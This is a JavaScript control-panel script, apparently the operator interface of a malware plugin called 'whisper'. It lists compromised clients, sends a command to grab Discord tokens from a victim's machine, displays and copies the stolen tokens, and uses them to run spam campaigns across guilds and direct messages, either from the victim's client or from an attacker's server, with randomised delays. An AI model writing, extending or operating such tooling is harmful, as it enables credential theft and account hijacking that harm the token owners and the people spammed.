const PLUGIN_ID = "whisper";
const VPS_KEY = "__vps__";

let currentClientId = "";
let liveStatus = "idle";
let lastGrabbedToken = "";

const $ = (id) => document.getElementById(id);

// Server-mode runs from the VPS and needs no client, so it uses its own
// namespace. Client-mode keys everything by the real client id.
function scopeKey() {
  if (mode() === "server") return VPS_KEY;
  return currentClientId || "";
}

function mode() {
  return $("where").value;
}

function isServerMode() {
  return mode() === "server";
}

function syncModeUi() {
  const server = isServerMode();
  const card = $("clientCard");
  card.style.opacity = server ? "0.45" : "1";
  card.style.pointerEvents = server ? "none" : "auto";
  $("grabTokens").textContent = server ? "grab token from client (optional)" : "grab token from client";
}

async function rpc(method, params = {}) {
  const res = await fetch(`/api/plugins/${PLUGIN_ID}/rpc`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ method, params }),
  });
  const body = await res.json().catch(() => ({}));
  if (!body.ok) throw new Error(body.error || `rpc ${method} failed: ${res.status}`);
  return body.result;
}

async function sendEvent(event, payload) {
  if (!currentClientId) {
    log("no client id set", "err");
    return;
  }
  const res = await fetch(`/api/clients/${currentClientId}/plugins/${PLUGIN_ID}/event`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event, payload }),
  });
  if (!res.ok) log(`event ${event} failed: ${res.status}`, "err");
}

function collectSettings() {
  const messages = $("messages").value
    .split("\n")
    .map((s) => s.trim())
    .filter(Boolean);
  const targets = [];
  if ($("tGuilds").checked) targets.push("guilds");
  if ($("tDms").checked) targets.push("dms");
  return {
    source: $("source").value,
    where: $("where").value,
    messages: messages.length ? messages : ["default whisper"],
    minDelayMs: parseInt($("minDelay").value, 10) || 2000,
    maxDelayMs: parseInt($("maxDelay").value, 10) || 8000,
    targets,
    textOnly: $("textOnly").checked,
    token: $("token").value.trim(),
    maxPerChannel: parseInt($("maxPerChannel").value, 10) || 1,
    announcementChans: $("announcementChans").checked,
  };
}

function setBadge(state) {
  liveStatus = state;
  const b = $("statusBadge");
  b.className = "badge " + state;
  b.textContent = state;
}

function setProgress(sent, total) {
  $("progressText").textContent = `${sent} / ${total}`;
  const pct = total > 0 ? Math.min(100, Math.round((sent / total) * 100)) : 0;
  $("progressFill").style.width = pct + "%";
}

function renderTokens(list) {
  const el = $("tokenList");
  if (!list || !list.length) {
    el.className = "tokens empty";
    el.textContent = "none grabbed yet";
    return;
  }
  if (list.length) lastGrabbedToken = list[0].token;
  el.className = "tokens";
  el.innerHTML = "";
  list.forEach((t) => {
    const row = document.createElement("div");
    row.className = "token-row";
    const src = document.createElement("div");
    src.className = "src";
    src.textContent = t.source || "discord";
    const val = document.createElement("div");
    val.className = "val";
    val.textContent = t.token;
    val.title = "click to copy";
    val.style.cursor = "pointer";
    val.onclick = () => {
      navigator.clipboard.writeText(t.token).then(() => log("token copied", "ok"));
    };
    row.appendChild(src);
    row.appendChild(val);
    el.appendChild(row);
  });
}

function log(text, kind = "") {
  const el = $("log");
  const line = document.createElement("div");
  line.className = "line" + (kind ? " " + kind : "");
  const ts = document.createElement("span");
  ts.className = "ts";
  ts.textContent = new Date().toLocaleTimeString();
  line.appendChild(ts);
  line.appendChild(document.createTextNode(text));
  el.appendChild(line);
  while (el.children.length > 300) el.removeChild(el.firstChild);
  el.scrollTop = el.scrollHeight;
}

function handleStream(data) {
  if (!data) return;
  const evt = data.event;
  const p = data.payload ?? data;

  // In vps mode nothing is tied to a client, so accept every broadcast.
  if (!isServerMode() && p && p.clientId && p.clientId !== currentClientId) return;
  if (isServerMode() && p && p.clientId && p.clientId !== VPS_KEY) return;

  switch (evt) {
    case "status":
      setBadge(p.state || "idle");
      if (p.user) log(`account: ${p.user}`, "ok");
      if (p.detail) log(p.detail);
      if (p.state === "done") log(`done. sent ${p.sent ?? ""} messages.`, "ok");
      break;
    case "tokens":
      renderTokens(p.tokens);
      log(`grabbed ${(p.tokens || []).length} token(s)`, "ok");
      break;
    case "progress":
      setProgress(p.sent || 0, p.total || 0);
      if (p.channel) {
        $("channelNow").textContent = p.guild ? `${p.guild} / ${p.channel}` : p.channel;
      }
      break;
    case "error":
      log(p.message || "error", "err");
      break;
    case "settings_updated":
      log("settings applied on client");
      break;
    default:
      break;
  }
}

const STREAM_CHANNELS = ["status", "tokens", "progress", "error", "settings_updated", "pong"];

function connectStream() {
  const es = new EventSource(`/api/plugins/${PLUGIN_ID}/stream`);
  STREAM_CHANNELS.forEach((ch) => {
    es.addEventListener(ch, (ev) => {
      let data;
      try { data = JSON.parse(ev.data); } catch { data = null; }
      if (data == null) return;
      handleStream({ event: ch, payload: data });
    });
  });
  es.onerror = () => {
    es.close();
    setTimeout(connectStream, 3000);
  };
}

async function refreshClients() {
  try {
    const clients = await rpc("list_clients");
    const dl = $("clientsList");
    dl.innerHTML = "";
    clients.forEach((c) => {
      const o = document.createElement("option");
      o.value = c.clientId;
      dl.appendChild(o);
    });
    $("clientCount").textContent =
      clients.length ? `${clients.length} client(s) seen` : "no clients seen yet";
    // Never auto-pick a client in vps mode — that was silently binding the
    // server-side job to an unrelated client.
    if (clients.length && !currentClientId && !isServerMode()) {
      currentClientId = clients[0].clientId;
      $("clientId").value = currentClientId;
      loadState();
    }
    log(`refresh: ${clients.length} client(s)`);
  } catch (e) {
    log("refresh failed: " + e.message, "err");
  }
}

async function loadState() {
  const key = scopeKey();
  if (!key) return;
  try {
    const [settings, state] = await Promise.all([
      rpc("get_settings", { clientId: key }),
      rpc("get_state", { clientId: key }),
    ]);
    $("source").value = settings.source || "app";
    $("where").value = settings.where || "client";
    $("messages").value = (settings.messages || []).join("\n");
    $("minDelay").value = settings.minDelayMs ?? 2000;
    $("maxDelay").value = settings.maxDelayMs ?? 8000;
    $("tGuilds").checked = (settings.targets || []).includes("guilds");
    $("tDms").checked = (settings.targets || []).includes("dms");
    $("textOnly").checked = settings.textOnly !== false;
    $("announcementChans").checked = !!settings.announcementChans;
    $("maxPerChannel").value = settings.maxPerChannel ?? 1;
    $("token").value = settings.token || "";
    setBadge(state.status || "idle");
    setProgress(state.sent || 0, state.total || 0);
    renderTokens(state.tokens || []);
  } catch (e) {
    log("load state failed: " + e.message, "err");
  }
}

async function start() {
  const s = collectSettings();
  const key = scopeKey();
  try {
    if (s.where === "server") {
      const token = s.token || lastGrabbedToken;
      if (!token) {
        log("vps mode needs a token — paste one, or grab from a client first", "err");
        return;
      }
      if (!s.token && lastGrabbedToken) {
        s.token = lastGrabbedToken;
        $("token").value = lastGrabbedToken;
      }
      await rpc("save_settings", { clientId: key, config: s });
      await rpc("start_server", { clientId: key, token, config: s });
      log("vps spam started from this server");
    } else {
      if (!currentClientId) {
        log("client mode needs a client id", "err");
        return;
      }
      await rpc("save_settings", { clientId: key, config: s });
      await sendEvent("start", s);
      log("start command sent to client");
    }
  } catch (e) {
    log("start failed: " + e.message, "err");
  }
}

function stop() {
  if (isServerMode()) {
    rpc("stop_server", { clientId: VPS_KEY })
      .then(() => log("server stop sent"))
      .catch((e) => log("stop failed: " + e.message, "err"));
  } else {
    if (!currentClientId) {
      log("client mode needs a client id", "err");
      return;
    }
    sendEvent("stop", {});
    log("stop command sent to client");
  }
}

function bind() {
  $("clientId").addEventListener("change", (e) => {
    currentClientId = e.target.value.trim();
    loadState();
  });

  $("where").addEventListener("change", () => {
    syncModeUi();
    loadState();
  });

  $("refreshClients").addEventListener("click", refreshClients);
  $("grabTokens").addEventListener("click", () => {
    if (isServerMode() && !currentClientId) {
      log("grab needs a client — set a client id first, or paste the token manually", "err");
      return;
    }
    sendEvent("grab", { source: $("source").value });
  });
  $("start").addEventListener("click", start);
  $("stop").addEventListener("click", stop);
}

bind();
syncModeUi();
connectStream();
loadState();
refreshClients();
